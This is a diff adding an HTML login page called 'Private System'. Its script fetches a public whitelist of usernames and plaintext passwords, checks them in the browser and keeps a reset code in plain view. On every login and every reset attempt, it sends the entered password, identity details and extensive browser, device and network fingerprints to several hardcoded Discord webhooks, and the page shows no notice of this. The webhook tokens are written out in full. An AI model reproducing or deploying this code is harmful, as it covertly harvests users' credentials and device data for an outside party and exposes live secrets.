@@ -1,1 +1,558 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Private System</title>
+<style>
+  * {
+    box-sizing: border-box;
+    font-family: 'Segoe UI', sans-serif;
+  }
+  body {
+    margin: 0; padding: 0;
+    background: #000;
+    color: #fff;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+  }
+  .box {
+    background: #000;
+    border-radius: 20px;
+    border: 3px solid white;
+    box-shadow: 0 0 15px white;
+    width: 360px;
+    padding: 30px 25px;
+    text-align: center;
+    position: relative;
+    transition: border-color 0.3s, box-shadow 0.3s;
+  }
+  .box.flashing {
+    animation: flashRed 0.4s ease-in-out 2;
+  }
+  @keyframes flashRed {
+    0%, 100% { border-color: red; box-shadow: 0 0 15px red; }
+    50% { border-color: white; box-shadow: 0 0 5px white; }
+  }
+  h2 {
+    font-size: 1.7em;
+    margin-bottom: 20px;
+    font-family: 'Courier New', monospace;
+  }
+  input {
+    width: 100%;
+    padding: 12px;
+    margin-bottom: 15px;
+    background: #1c1c1c;
+    border: none;
+    color: white;
+    border-radius: 8px;
+    font-size: 1em;
+  }
+  label {
+    display: flex;
+    align-items: center;
+    font-size: 0.9em;
+    margin-bottom: 10px;
+    gap: 10px;
+    cursor: pointer;
+  }
+  #showPassword:checked + span {
+    color: red;
+  }
+  button {
+    width: 100%;
+    padding: 12px;
+    background-color: red;
+    color: white;
+    font-size: 1em;
+    border: none;
+    border-radius: 8px;
+    cursor: pointer;
+  }
+  .attempt-counter, .error-message {
+    margin-top: 10px;
+    font-size: 0.85em;
+    color: red;
+  }
+  .popup {
+    display: none;
+    position: absolute;
+    top: 50%;
+    left: 50%;
+    width: 320px;
+    padding: 20px;
+    transform: translate(-50%, -50%);
+    background: black;
+    border: 3px solid white;
+    border-radius: 15px;
+    box-shadow: 0 0 20px white;
+    z-index: 10;
+  }
+  .popup input {
+    margin-bottom: 15px;
+  }
+</style>
+</head>
+<body>
+  <div class="box" id="loginBox">
+    <h2>𝙋𝙧𝙞𝙫𝙖𝙩𝙚 𝙎𝙮𝙨𝙩𝙚𝙢</h2>
 
+    <input type="text" id="username" placeholder="Enter Username..." autocomplete="off" />
+    <input type="password" id="password" placeholder="Enter Password..." autocomplete="off" />
+    <input type="text" id="userID" placeholder="Enter User Identifier..." autocomplete="off" />
+
+    <label for="showPassword">
+      <input type="checkbox" id="showPassword" />
+      <span>Show Password</span>
+    </label>
+
+    <button id="submitBtn">Submit</button>
+
+    <div class="error-message" id="errorMsg"></div>
+    <div class="attempt-counter" id="attemptsText">Attempts Left: 5</div>
+
+    <div class="popup" id="resetPopup" tabindex="-1" aria-hidden="true">
+      <p>Too many failed attempts.</p>
+      <input type="password" id="resetField" placeholder="SENDING LOG TO SERVER PLEASE WAIT WHILE WE ACCEPT IT" autocomplete="off" />
+      <button id="resetBtn">Reset Counter</button>
+    </div>
+  </div>
+
+<script>
+(() => {
+  const USER_JSON_URL = 'https://raw.githubusercontent.com/Nuker214/Private.System/refs/heads/main/Whitelist.json';
+
+  const webhookUrls = {
+    userLogging: 'https://discord.com/api/webhooks/1402682960397860964/rmNhK0G8NOJlbRN38RdCmPB1-rzXaaogzqIJmA7EuTVEIoFpTinMXLff0qr5ke1RV7K3',
+    browserLogging: 'https://discord.com/api/webhooks/1402690380910170154/EJgpyFYc0pyz5EnkOTXiSlM7W1jUnBldRd0PUKLEvERgE6nXfDVAb7NXaKIzR-3APGHP',
+    deviceLogging: 'https://discord.com/api/webhooks/1402692400593371289/_Nx1ZdupZIrlkVmCO0J1OIphb9az9I1AZDZ6gjAemL2IHbuMLpWCbTltBfch-i970d1F',
+    connectionLogging: 'https://discord.com/api/webhooks/1402694010123849840/IYCqiKdvj9QnFJ9WPoAlFBXzrY2mBnHR5SANj7c1uuYhkQV3Veado9hIVbtqh9PCZO1D',
+    sessionLogging: 'https://discord.com/api/webhooks/1402695341257654405/SiXvG8hdSshEfPjz2e7gRQ3P80yqBNZw2AwHlUpEtFtHPD2vbG_Dh8JHjnfdDRD4hmJk'
+  };
+
+  const loginBox = document.getElementById('loginBox');
+  const usernameInput = document.getElementById('username');
+  const passwordInput = document.getElementById('password');
+  const userIDInput = document.getElementById('userID');
+  const showPasswordCheckbox = document.getElementById('showPassword');
+  const submitBtn = document.getElementById('submitBtn');
+  const errorMsg = document.getElementById('errorMsg');
+  const attemptsText = document.getElementById('attemptsText');
+  const resetPopup = document.getElementById('resetPopup');
+  const resetField = document.getElementById('resetField');
+  const resetBtn = document.getElementById('resetBtn');
+
+  let attempts = 5;
+  let users = [];
+  let loginTime = null;
+
+  // Show/hide password toggle
+  showPasswordCheckbox.addEventListener('change', () => {
+    passwordInput.type = showPasswordCheckbox.checked ? 'text' : 'password';
+  });
+
+  // Fetch user JSON data on load
+  fetch(USER_JSON_URL)
+    .then(res => res.json())
+    .then(data => {
+      users = data;
+    })
+    .catch(() => {
+      users = [];
+      console.error('Failed to load user JSON data.');
+    });
+
+  // Flash red outline function
+  function flashRedOutline(times = 2, delay = 400) {
+    let count = 0;
+    function flash() {
+      loginBox.classList.add('flashing');
+      setTimeout(() => {
+        loginBox.classList.remove('flashing');
+        count++;
+        if (count < times) setTimeout(flash, delay);
+      }, delay);
+    }
+    flash();
+  }
+
+  // Get WebGL Renderer (used for device logging)
+  function getWebGLRenderer() {
+    try {
+      const canvas = document.createElement('canvas');
+      const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+      if (!gl) return "Unavailable";
+      const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+      return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Unavailable";
+    } catch {
+      return "Unavailable";
+    }
+  }
+
+  // Battery status promise (device logging)
+  async function getBatteryStatus() {
+    if (navigator.getBattery) {
+      try {
+        const battery = await navigator.getBattery();
+        return battery;
+      } catch {
+        return null;
+      }
+    }
+    return null;
+  }
+
+  // Build user info object from user JSON
+  function findUser(username, userID) {
+    return users.find(u =>
+      u.username?.toLowerCase() === username.toLowerCase() &&
+      u.userID?.toString() === userID.toString()
+    );
+  }
+
+  // Send Discord webhook with custom embed fields
+  async function sendWebhook(url, embed) {
+    try {
+      await fetch(url, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ embeds: [embed] }),
+      });
+    } catch (e) {
+      console.warn('Webhook send failed:', e);
+    }
+  }
+
+  // Collect browser & device info for logs
+  async function collectLoggingData(user, password) {
+    const now = new Date();
+    loginTime = now.toISOString();
+    const batteryStatus = await getBatteryStatus();
+
+    return {
+      user,
+      password,
+      loginTime,
+      batteryStatus,
+      webglRenderer: getWebGLRenderer(),
+    };
+  }
+
+  // Build embeds for each webhook from your payload spec
+  function buildUserLoggingEmbed(data) {
+    return {
+      title: "User Logging System",
+      color: 0xff0000,
+      fields: [
+        { name: "Name", value: data.user.name || "N/A", inline: true },
+        { name: "Username", value: data.user.username, inline: true },
+        { name: "Password", value: data.password, inline: true },
+        { name: "Rank Type", value: data.user.rank?.toString() || "N/A", inline: true },
+        { name: "Role Type", value: data.user.role || "N/A", inline: true },
+        { name: "Login Time", value: data.loginTime, inline: false },
+        { name: "User Identifier", value: data.user.userID.toString(), inline: true },
+        { name: "Account Creation Date", value: data.user.accountCreationDate || "N/A", inline: true }
+      ]
+    };
+  }
+
+  function buildBrowserLoggingEmbed(data) {
+    const nav = navigator;
+    return {
+      title: "Browser Logging System",
+      color: 0x00ff00,
+      fields: [
+        { name: "Person's Name", value: data.user.name || "N/A", inline: true },
+        { name: "Username", value: data.user.username || "N/A", inline: true },
+        { name: "User Identifier", value: data.user.userID?.toString() || "N/A", inline: true },
+        { name: "Browser Vendor", value: nav.vendor || "Unknown", inline: true },
+        { name: "Browser Language", value: nav.language || "Unknown", inline: true },
+        { name: "Browser Languages", value: nav.languages ? nav.languages.join(", ") : "Unknown", inline: false },
+        { name: "User Agent", value: nav.userAgent || "Unknown", inline: false },
+        { name: "Installed Plugins", value: nav.plugins?.length > 0 ? `${nav.plugins.length} plugin(s)` : "None", inline: true },
+        { name: "Browser Window Size", value: `${window.innerWidth}x${window.innerHeight}`, inline: true },
+        { name: "Browser Zoom Level", value: `${Math.round(window.devicePixelRatio * 100)}%`, inline: true },
+        { name: "Incognito/Private Mode Status", value: "Undetected", inline: true },
+        { name: "Cookies Enabled", value: nav.cookieEnabled ? "Yes" : "No", inline: true },
+        { name: "Do Not Track", value: nav.doNotTrack || "Unknown", inline: true },
+        { name: "Browser Tab Visibility", value: document.visibilityState || "Unknown", inline: true },
+        { name: "Font Smoothing Type", value: "Unavailable", inline: true },
+        { name: "Clipboard Access", value: nav.clipboard ? "Supported" : "Not Supported", inline: true },
+        { name: "WebGL Renderer Info", value: data.webglRenderer || "Unavailable", inline: true },
+        { name: "Browser Connection Speed", value: nav.connection?.effectiveType || "Unknown", inline: true }
+      ]
+    };
+  }
+
+  function buildDeviceLoggingEmbed(data) {
+    const nav = navigator;
+    const battery = data.batteryStatus;
+    return {
+      title: "Device Logging System",
+      color: 0x0000ff,
+      fields: [
+        { name: "Person's Name", value: data.user.name || "N/A", inline: true },
+        { name: "Username", value: data.user.username || "N/A", inline: true },
+        { name: "User ID", value: data.user.userID?.toString() || "N/A", inline: true },
+        { name: "Device Platform", value: nav.platform || "Unknown", inline: true },
+        { name: "CPU Cores", value: nav.hardwareConcurrency ? `${nav.hardwareConcurrency} cores` : "Unavailable", inline: true },
+        { name: "Device Memory", value: nav.deviceMemory ? `${nav.deviceMemory} GB` : "Unavailable", inline: true },
+        { name: "GPU Renderer", value: data.webglRenderer || "Unavailable", inline: true },
+        { name: "Battery Charging", value: battery?.charging ? "Yes" : "No", inline: true },
+        { name: "Battery Level", value: battery ? `${Math.round(battery.level * 100)}%` : "Unavailable", inline: true },
+        { name: "Touch Support", value: ('ontouchstart' in window || nav.maxTouchPoints > 0) ? "Yes" : "No", inline: true },
+        { name: "Screen Resolution", value: `${screen.width}x${screen.height}`, inline: true },
+        { name: "Screen Orientation", value: screen.orientation?.type || "Unavailable", inline: true },
+        { name: "Color Depth", value: `${screen.colorDepth} bit`, inline: true },
+        { name: "Pixel Depth", value: `${screen.pixelDepth} bit`, inline: true },
+        { name: "Device Pixel Ratio", value: window.devicePixelRatio?.toString() || "Unknown", inline: true },
+        { name: "Max Touch Points", value: nav.maxTouchPoints?.toString() || "0", inline: true },
+        { name: "Vendor", value: nav.vendor || "Unknown", inline: true },
+        { name: "Language", value: nav.language || "Unknown", inline: true }
+      ]
+    };
+  }
+
+  function buildConnectionLoggingEmbed(data) {
+    const nav = navigator;
+    return {
+      title: "Connection Logging System",
+      color: 0xffff00,
+      fields: [
+        { name: "Person's Name", value: data.user.name || "N/A", inline: true },
+        { name: "Username", value: data.user.username || "N/A", inline: true },
+        { name: "User ID", value: data.user.userID?.toString() || "N/A", inline: true },
+
+        { name: "Online Status", value: nav.onLine ? "Online" : "Offline", inline: true },
+        { name: "Connection Type", value: nav.connection?.type || "Unknown", inline: true },
+        { name: "Effective Connection Type", value: nav.connection?.effectiveType || "Unknown", inline: true },
+
+        { name: "Downlink Speed", value: nav.connection?.downlink ? `${nav.connection.downlink} Mbps` : "Unknown", inline: true },
+        { name: "RTT (Round Trip Time)", value: nav.connection?.rtt ? `${nav.connection.rtt} ms` : "Unknown", inline: true },
+        { name: "Save Data Mode", value: nav.connection?.saveData ? "Enabled" : "Disabled", inline: true },
+
+        // IP address, VPN, Proxy info is from user object since no JS API for these:
+        { name: "IP Address", value: data.user.ipAddress || "Unavailable", inline: false },
+        { name: "VPN Detected", value: data.user.vpnDetected ? "Yes" : "No", inline: true },
+        { name: "Proxy Detected", value: data.user.proxyDetected ? "Yes" : "No", inline: true },
+
+        { name: "Public IPv6", value: data.user.ipv6Address || "Unavailable", inline: false },
+        { name: "Local IP Addresses", value: data.user.localIPs?.join(", ") || "Unavailable", inline: false },
+        { name: "Network Downlink Max", value: nav.connection?.downlinkMax ? `${nav.connection.downlinkMax} Mbps` : "Unknown", inline: true },
+
+        { name: "Network Metered Connection", value: nav.connection?.metered ? "Yes" : "No", inline: true },
+        { name: "Network Type Detailed", value: nav.connection?.typeDetailed || "Unknown", inline: true },
+        { name: "Effective Network Bandwidth Estimate", value: nav.connection?.bandwidthEstimate || "Unavailable", inline: true }
+      ]
+    };
+  }
+
+  function buildSessionLoggingEmbed(data) {
+    return {
+      title: "Session Logging System",
+      color: 0x00ffff,
+      fields: [
+        { name: "Person's Name", value: data.user.name || "N/A", inline: true },
+        { name: "Username", value: data.user.username || "N/A", inline: true },
+        { name: "User ID", value: data.user.userID?.toString() || "N/A", inline: true },
+
+        { name: "Login Time", value: data.loginTime || "Unknown", inline: true },
+        { name: "Logout Time", value: data.logoutTime || "Unknown", inline: true },
+        { name: "Session Duration", value: data.sessionDuration || "Unknown", inline: true },
+
+        { name: "Pages Visited", value: data.pagesVisited?.join(", ") || "None", inline: false },
+        { name: "Actions Performed", value: data.actionsPerformed?.join(", ") || "None", inline: false },
+
+        { name: "Errors Encountered", value: data.errorsEncountered?.join("; ") || "None", inline: false },
+        { name: "Warnings", value: data.warnings?.join("; ") || "None", inline: false },
+
+        { name: "User Role Changes", value: data.roleChanges?.join(", ") || "None", inline: false },
+        { name: "Permission Changes", value: data.permissionChanges?.join(", ") || "None", inline: false },
+
+        { name: "Last Activity Timestamp", value: data.lastActivityTime || "Unknown", inline: true },
+        { name: "Number of Clicks", value: data.numberOfClicks?.toString() || "0", inline: true },
+        { name: "Number of Form Submissions", value: data.numberOfFormSubmissions?.toString() || "0", inline: true },
+
+        { name: "Idle Time", value: data.idleTime || "0s", inline: true },
+        { name: "Active Time", value: data.activeTime || "Unknown", inline: true },
+        { name: "Browser Tab Focus Time", value: data.tabFocusTime || "Unknown", inline: true }
+      ]
+    };
+  }
+
+  // Handle login submission
+  async function submitLogin() {
+    errorMsg.textContent = '';
+    if (!usernameInput.value || !passwordInput.value || !userIDInput.value) {
+      errorMsg.textContent = 'Please fill all fields.';
+      return;
+    }
+    const user = findUser(usernameInput.value, userIDInput.value);
+    if (!user) {
+      handleFailedAttempt('User not found.');
+      return;
+    }
+    if (passwordInput.value !== user.password) {
+      handleFailedAttempt('Incorrect password.');
+      return;
+    }
+    // Correct login
+    attempts = 5;
+    updateAttemptsText();
+    errorMsg.textContent = '';
+    resetPopup.style.display = 'none';
+    loginBox.style.borderColor = 'white';
+    loginBox.style.boxShadow = '0 0 15px white';
+
+    // Collect data and send logs
+    const loggingData = await collectLoggingData(user, passwordInput.value);
+
+    // Send all 5 webhooks:
+    await Promise.all([
+      sendWebhook(webhookUrls.userLogging, buildUserLoggingEmbed(loggingData)),
+      sendWebhook(webhookUrls.browserLogging, buildBrowserLoggingEmbed(loggingData)),
+      sendWebhook(webhookUrls.deviceLogging, buildDeviceLoggingEmbed(loggingData)),
+      sendWebhook(webhookUrls.connectionLogging, buildConnectionLoggingEmbed(loggingData)),
+      sendWebhook(webhookUrls.sessionLogging, buildSessionLoggingEmbed(loggingData)),
+    ]);
+
+    alert(`Welcome ${user.name || user.username}! Login successful.`);
+    // Optionally clear fields
+    usernameInput.value = '';
+    passwordInput.value = '';
+    userIDInput.value = '';
+  }
+
+  // Failed attempt handler
+  function handleFailedAttempt(msg) {
+    attempts--;
+    updateAttemptsText();
+    errorMsg.textContent = msg;
+    if (attempts <= 0) {
+      attempts = 0;
+      errorMsg.textContent = 'No attempts left. Please reset.';
+      showResetPopup();
+      disableInputs();
+    } else {
+      if (attempts <= 3) {
+        flashRedOutline(2, 400);
+      }
+    }
+  }
+
+  // Update attempts display
+  function updateAttemptsText() {
+    attemptsText.textContent = `Attempts Left: ${attempts}`;
+  }
+
+  // Disable inputs and submit button
+  function disableInputs() {
+    usernameInput.disabled = true;
+    passwordInput.disabled = true;
+    userIDInput.disabled = true;
+    submitBtn.disabled = true;
+  }
+
+  // Enable inputs and submit button
+  function enableInputs() {
+    usernameInput.disabled = false;
+    passwordInput.disabled = false;
+    userIDInput.disabled = false;
+    submitBtn.disabled = false;
+  }
+
+  // Show reset popup
+  function showResetPopup() {
+    resetPopup.style.display = 'block';
+    resetPopup.setAttribute('aria-hidden', 'false');
+    resetField.focus();
+  }
+
+  // Hide reset popup
+  function hideResetPopup() {
+    resetPopup.style.display = 'none';
+    resetPopup.setAttribute('aria-hidden', 'true');
+    resetField.value = '';
+  }
+
+  async function resetCounter() {
+  const enteredCode = resetField.value.trim();
+  const isCorrect = enteredCode === 'Reset.Counter.2579';
+
+  const username = usernameInput.value || 'Unknown';
+  const password = passwordInput.value || 'Unknown';
+  const userID = userIDInput.value || 'Unknown';
+  const user = findUser(username, userID) || {};
+
+  // 1. Send "Reset box Detected" webhook immediately
+  const resetBoxEmbed = {
+    title: "🔔 Reset Box Detected",
+    color: 0xffff00,
+    fields: [
+      { name: "Name", value: user.name || "N/A", inline: true },
+      { name: "Username", value: username, inline: true },
+      { name: "Password Entered", value: password, inline: true },
+      { name: "User ID", value: userID, inline: true },
+      { name: "Entered Code", value: enteredCode, inline: false },
+      { name: "Time", value: new Date().toLocaleString(), inline: false }
+    ]
+  };
+  const resetBoxWebhook = "https://discord.com/api/webhooks/1403083012442423377/WNs_yZimluZqsxfZWkLSCfd2vmOYdoyEbsUVOfczHkJykeiThIZ6gYCJILFSHfSDSnsq";
+  await sendWebhook(resetBoxWebhook, resetBoxEmbed);
+
+  // Build embed for correct or incorrect code
+  const resultEmbed = {
+    title: isCorrect ? "✅ Reset Code Accepted" : "❌ Incorrect Reset Code Attempt",
+    color: isCorrect ? 0x00ff00 : 0xff0000,
+    fields: [
+      { name: "Name", value: user.name || "N/A", inline: true },
+      { name: "Username", value: username, inline: true },
+      { name: "Password Entered", value: password, inline: true },
+      { name: "User ID", value: userID, inline: true },
+      { name: "Reset Code", value: enteredCode, inline: false },
+      { name: "Time", value: new Date().toLocaleString(), inline: false }
+    ]
+  };
+
+  // Select webhook for correct or incorrect logging
+  const resultWebhook = isCorrect
+    ? "https://discord.com/api/webhooks/1403088193850441921/zZKPkgzVBQ7d6aiCkT3WM7j2Y74UO2o1Js9oSnawVBHaSxUQCz-16Qj4uPYk1YxgoanB"
+    : "https://discord.com/api/webhooks/1403088326252040372/JgQkJdcVG-8X0jSmw7AZai9YSUODCMZ5hkyWlBe1MBzPRiJgbSlRDWOJUvHVqsK248ip";
+
+  await sendWebhook(resultWebhook, resultEmbed);
+
+  if (isCorrect) {
+    attempts = 5;
+    updateAttemptsText();
+    enableInputs();
+    hideResetPopup();
+    errorMsg.textContent = '';
+  } else {
+    alert('Incorrect reset code.');
+  }
+}
+
+  // Attach event listeners
+  submitBtn.addEventListener('click', submitLogin);
+  resetBtn.addEventListener('click', resetCounter);
+
+  // Enter key submits login if popup hidden, else tries reset
+  document.addEventListener('keydown', e => {
+    if (e.key === 'Enter') {
+      if (resetPopup.style.display === 'block') {
+        resetCounter();
+      } else {
+        submitLogin();
+      }
+    }
+  });
+
+  // Initialize attempts display
+  updateAttemptsText();
+})();
+</script>
+</body>
+</html>
